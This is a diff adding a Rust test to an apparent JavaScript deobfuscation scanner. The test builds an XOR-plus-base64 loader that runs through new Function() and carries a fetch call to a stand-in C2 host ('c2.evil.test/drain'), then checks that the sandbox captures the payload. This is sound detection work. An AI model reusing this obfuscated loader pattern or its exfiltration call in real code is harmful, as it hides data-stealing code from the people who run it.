@@ -497,6 +497,29 @@ mod deep_tests {
     }
 
     #[test]
+    fn deep_recovers_xor_base64_new_function() {
+        // CARAPACE-14: an XOR+base64 blob decoded by the script's own loop and run
+        // via new Function() — the marjdl.pro (case 230/231/233) crypto-stealer /
+        // ClickFix shape. The sandbox lets atob + the XOR loop run for real and
+        // captures the string handed to Function() instead of executing it.
+        let payload = "fetch('https://c2.evil.test/drain')";
+        let key: u8 = 0x42;
+        let xored: Vec<u8> = payload.bytes().map(|b| b ^ key).collect();
+        let blob = base64::engine::general_purpose::STANDARD.encode(&xored);
+        let src = format!(
+            "var b=atob(\"{blob}\");var o=\"\";\
+             for(var i=0;i<b.length;i++){{o+=String.fromCharCode(b.charCodeAt(i)^{key});}}\
+             new Function(o)();",
+            blob = blob, key = key,
+        );
+        let payloads = deobfuscate_deep(&src, &limits(), Instant::now() + Duration::from_secs(8));
+        assert!(
+            payloads.iter().any(|p| p.code.contains("c2.evil.test")),
+            "XOR+base64 -> new Function payload must be captured; got: {:?}", payloads
+        );
+    }
+
+    #[test]
     fn deep_on_clean_code_yields_nothing() {
         let payloads = deobfuscate_deep(
             "function add(a,b){return a+b;} add(1,2);",
